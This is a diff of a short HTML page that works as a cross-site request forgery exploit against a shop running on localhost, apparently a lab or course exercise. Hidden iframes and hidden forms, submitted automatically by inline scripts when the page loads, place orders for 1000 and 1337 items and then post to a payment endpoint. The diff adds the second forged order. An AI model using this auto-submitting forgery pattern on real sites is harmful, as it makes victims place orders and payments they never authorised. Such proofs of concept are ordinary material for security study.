@@ -5,16 +5,18 @@
 <body>
 	<iframe style="display:none" name="csrfItem"></iframe>
 	<iframe style="display:none" name="csrfPay"></iframe>
-		<form id="item-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem">
-			<!-- <select type=hidden name=nbrOfItems >
-				<option value=1000 selected/>
-					</select> -->
+		<form id="item1-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem">
 			<input type=hidden name=nbrOfItems value=1000>
 			<input type=hidden name=itemid value=2>
 		</form>
+		<form id="item2-form" name="itemorder" method="post" action="https://127.0.0.1/index.php" target="csrfItem">
+			<input type=hidden name=nbrOfItems value=1337>
+			<input type=hidden name=itemid value=1>
+		</form>
 		<form id="pay-form" name="payment" method="post" action="https://127.0.0.1/receipt.php" target="csrfPay">
 		</form>
-		<script>document.getElementById("item-form").submit()</script>
+		<script>document.getElementById("item1-form").submit()</script>
+		<script>document.getElementById("item2-form").submit()</script>
 		<script>document.getElementById("pay-form").submit()</script>
 </body>
 </html>
